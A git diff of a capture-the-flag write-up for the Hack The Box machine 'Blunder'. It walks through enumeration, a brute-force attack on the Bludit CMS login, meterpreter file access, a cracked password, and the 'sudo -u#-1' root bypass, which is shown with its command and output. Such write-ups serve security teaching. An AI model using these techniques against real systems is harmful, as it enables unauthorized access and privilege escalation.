@@ -6,21 +6,27 @@ description: >-
 
 # HTB - Blunder
 
-## Overview - TODO: finish polishing
+## Overview
 
 ![](../../.gitbook/assets/screenshot-2020-10-27-201546.png)
 
-Short description to include any strange things to be dealt with
+This easy difficulty Linux machine featured a content management system that was new to me, and a simple to use but interesting way to bypass a common configuration used by system administrators to grant permissions without allowing root access.  It required writing a Python script to brute force a login, and had multiple ways to exploit the vulnerable service to gain access.  The root privilege escalation method was very realistic, but so simple and easy to do it was almost disappointing to complete this machine so quickly.
 
 ## Useful Skills and Tools
 
 #### Bypass restrictions on running commands as root `sudo (ALL, !root) /bin/bash`
 
-* description with generic example
-
-#### Useful thing 2
-
-* description with generic example
+* `sudo` allows for the specification of running commands as a specific user with the `-u` flag. 
+* To exploit the above restriction on running commands as `root` **in versions of `sudo` &lt; 1.8.28**
+  * Instead of specifying a username with the `-u` flag, use the user's ID number \(root is `#0` for example, but will not work since commands as root are disallowed in this case.\)
+  * Specify an invalid number which overflows the integer buffer for the command. The easy way to do this is to use `#-1` since this is an unsigned integer and will flip the bits around to be Integer\_Max -1.  
+  * You must know the current user's password to do this, since you are running a `sudo` command.
+  * ```text
+    $ sudo -u#-1 /bin/bash
+    Password: 
+    # id
+    uid=0(root) gid=1001(olduser) groups=1001(olduser)
+    ```
 
 ## Enumeration
 
@@ -45,11 +51,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 379.53 seconds
 ```
 
-only port 80 open
+There was not much to work with from my nmap scan as only port 80 was open.
 
 ![](../../.gitbook/assets/2-bluder-site.png)
 
-website of random facts.
+Since there was nothing else I could do, I navigated my web browser to the HTTP site hosted on port 80 and found a website of random facts about random subjects.
 
 ```text
 - Nikto v2.1.6
@@ -121,25 +127,31 @@ website of random facts.
 + 1 host(s) tested
 ```
 
-`nikto` reveals a lot of security misconfigurations, though not many seem accessible without credentials. 
+While manually checking out the site I ran `nikto`, which revealed a lot of security misconfigurations though not many seemed accessible without credentials. 
 
 ![](../../.gitbook/assets/3-admin-page%20%281%29.png)
 
-`/admin/` has login. \(no creds yet\)
+`The nikto scan did reveal an /admin/` page, at which I found a login page. I wasn't able to find anything useful and couldn't login without credentials.
 
 ![](../../.gitbook/assets/5-gitignore.png)
 
-`.gitignore` file possibly reveals directory structure.
+There was also a `.gitignore` file that revealed a potential internal directory structure. Searching for `bl-plugins` led to [https://docs.bludit.com/en/getting-started/plugins](https://docs.bludit.com/en/getting-started/plugins).  Bludit turned out to be a content management system for hosting blogs.  
+
+[https://www.bludit.com/](https://www.bludit.com/)
+
+> Simple, Fast, Secure, Flat-File CMS
+
+{% hint style="info" %}
+Don't Google **`bl-content`** to find information about this site.  I will not bring up what you are looking for!
+{% endhint %}
 
 ![](../../.gitbook/assets/4-already-installed.png)
 
-`install.php` found, reports that Bludit is already installed. - researched Bludit
+Using dirbuster I found `install.php` which reported that Bludit is already installed.
 
 ![](../../.gitbook/assets/6-todo.png)
 
-`todo.txt` contains a potential username `fergus`
-
-The header of the file `config.log` contained the lines:
+I also found the file `todo.txt` which contained a potential username `fergus` and some hardening steps that were taken to secure the site.
 
 ```text
 <!DOCTYPE html>
@@ -166,12 +178,14 @@ The header of the file `config.log` contained the lines:
     </head>
 ```
 
-"`/bl-kernel/img/favicon.png?version=3.9.2`" tells me the version of the service is 3.9.2 . Searching for "bludit 3.9.2 exploit" leads to
+The header of the file `config.log` contained the line "`/bl-kernel/img/favicon.png?version=3.9.2`" which told me the version of the Bludit service was 3.9.2 . I did some research on "bludit 3.9.2 exploit" which led me to a few useful sites.
 
 * [https://medium.com/@musyokaian/bludit-cms-version-3-9-2-brute-force-protection-bypass-283f39a84bbb](https://medium.com/@musyokaian/bludit-cms-version-3-9-2-brute-force-protection-bypass-283f39a84bbb)
 * [https://rastating.github.io/bludit-brute-force-mitigation-bypass/](https://rastating.github.io/bludit-brute-force-mitigation-bypass/) 
 * [https://github.com/averagesecurityguy/scripts/blob/master/bruteforce/multi\_ssh.py](https://github.com/averagesecurityguy/scripts/blob/master/bruteforce/multi_ssh.py) 
 * [https://github.com/bludit/bludit/issues/1081](https://github.com/bludit/bludit/issues/1081)
+
+From the information in these sites I gained enough information to craft a Python script to brute force the login of the CMS.  At first my script ran very slowly, so I looked up how to make the script multi-threaded to speed things up a bit.
 
 ```python
 #!/usr/bin/env python3
@@ -291,7 +305,7 @@ After writing my python brute-force program based off the one in the POC, I load
 
 ![](../../.gitbook/assets/7-password-found.png)
 
-This worked much faster. It still had to go through a few thousand tries, but for my multithreaded script it didn't take long.
+This worked much faster. It still had to go through a few thousand tries, but for my multi-threaded script it didn't take long.
 
 ## Initial Foothold
 
@@ -568,6 +582,17 @@ The most likely hash type was SHA-1.
 After trying a few online hash-cracking sites and getting nowhere, I decided to keep looking before resorting to trying `hashcat` or `john`.
 
 ```text
+meterpreter > cd /var/www/
+meterpreter > ls
+Listing: /var/www
+=================
+
+Mode             Size  Type  Last modified              Name
+----             ----  ----  -------------              ----
+40755/rwxr-xr-x  4096  dir   2020-05-19 10:13:22 -0400  bludit-3.10.0a
+40775/rwxrwxr-x  4096  dir   2020-04-28 07:18:03 -0400  bludit-3.9.2
+40755/rwxr-xr-x  4096  dir   2019-11-28 04:34:02 -0500  html
+
 meterpreter > cd /var/www/bludit-3.10.0a
 meterpreter > ls
 Listing: /var/www/bludit-3.10.0a
@@ -621,21 +646,9 @@ meterpreter > download users.php
 [*] Downloading: users.php -> users.php
 [*] Downloaded 597.00 B of 597.00 B (100.0%): users.php -> users.php
 [*] download   : users.php -> users.php
-meterpreter > cd /var/www/bludit-3.6.2
-[-] stdapi_fs_chdir: Operation failed: 1
-meterpreter > cd /var/www/
-meterpreter > ls
-Listing: /var/www
-=================
-
-Mode             Size  Type  Last modified              Name
-----             ----  ----  -------------              ----
-40755/rwxr-xr-x  4096  dir   2020-05-19 10:13:22 -0400  bludit-3.10.0a
-40775/rwxrwxr-x  4096  dir   2020-04-28 07:18:03 -0400  bludit-3.9.2
-40755/rwxr-xr-x  4096  dir   2019-11-28 04:34:02 -0500  html
 ```
 
-In the www folder I found a newer version of the Bludit CMS had been installed. I hoped that I would find a newer version of the database, and was not disappointed.
+In the www folder I found that a newer version of the Bludit CMS had been installed. I hoped that I would find a newer version of the database, and was not disappointed.
 
 ### Finding user creds
 
@@ -680,7 +693,7 @@ Mode             Size  Type  Last modified              Name
 
 ![](../../.gitbook/assets/9-password-cracked.png)
 
-The first hash cracking website I tried the hash on immediately revealed the password as `Password120`
+The first hash cracking website I tried the hash on immediately revealed the password as `Password120`.
 
 ### User.txt
 
@@ -697,8 +710,6 @@ ls
 ls
 categories.php  plugins       site.php    tags.php
 pages.php       security.php  syslog.php  users.php
-www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ export TERM=XTERM-color256
-<.2/bl-content/databases$ export TERM=XTERM-color256         
 www-data@blunder:/var/www/bludit-3.9.2/bl-content/databases$ su hugo
 su hugo
 Password: Password120
@@ -710,8 +721,10 @@ cat user.txt
 dcf1f1f3ecde4b372edf165518df8a77
 ```
 
+Once I got a system shell, I used my standard shell upgrade steps, but it didn't quite work the way I wanted, so I was stuck with a half-functional shell.  Despite this I was able to switch users to `hugo` and collect my `user.txt` proof.  
+
 {% hint style="info" %}
-Hint: trying to upgrade a shell by using **`stty raw -echo`** does not work in a shell gained through meterpreter...
+Hint: trying to upgrade the functionality of a shell by using **`stty raw -echo`** does not work in a shell gained through meterpreter...
 {% endhint %}
 
 ## Path to Power \(Gaining Administrator Access\)
@@ -769,21 +782,21 @@ hugo:x:1001:1001:Hugo,1337,07,08,09:/home/hugo:/bin/bash
 temp:x:1002:1002:,,,:/home/temp:/bin/bash
 ```
 
-three users can login besides root: `hugo`, `shaun`, and `temp`.
-
-`shaun`
+Looking into `/etc/passwd` revealed that there were three users who could login besides root: `hugo`, `shaun`, and `temp`.  I decided to next check the groups of each user to see if one had use groups for privilege escalation.  
 
 ```text
 hugo@blunder:/var/log$ id shaun
 uid=1000(shaun) gid=1000(shaun) groups=1000(shaun),4(adm),24(cdrom),30(dip),46(plugdev),119(lpadmin),130(lxd),131(sambashare)
 ```
 
+`shaun` had a few interesting sounding groups: `lpadmin` in particular sounded like something to check out.
+
 ```text
 hugo@blunder:/var/log$ groups temp
 temp : temp
 ```
 
-`temp` only has access to temp group
+`temp` only had access to the `temp` group.
 
 ```text
 hugo@blunder:~$ sudo -l
@@ -798,7 +811,7 @@ User hugo may run the following commands on blunder:
     (ALL, !root) /bin/bash
 ```
 
-I did a search for `sudo (ALL, !root) /bin/bash` and found an exploit on exploit-db which explains a privilege bypass method where you can get around the restriction on running commands as root \(`!root`\) by tricking sudo by giving the user id number `#-1`.
+I also did a privilege check for `hugo` using `sudo -l` and found that this user indeed had `sudo` rights, and some interesting privileges.  I did a search for `sudo (ALL, !root) /bin/bash` and found an exploit on exploit-db which explained a privilege bypass method where I could get around the restriction on running commands as root \(`!root`\) by tricking sudo by giving the user id number `#-1`.
 
  [https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502)
 
@@ -884,7 +897,7 @@ print("Lets hope it works")
 os.system("sudo -u#-1 "+ binary)
 ```
 
-The POC code for the exploit included a basic python script which could automate running a program as root, but it would be much easier to exploit this manually and get a root shell since it is so simple to execute.
+The POC code for the exploit included a basic Python script which could automate running a program as root, but it would be much easier to exploit this manually and get a root shell since it is so simple to execute.
 
 ### Getting a shell
 
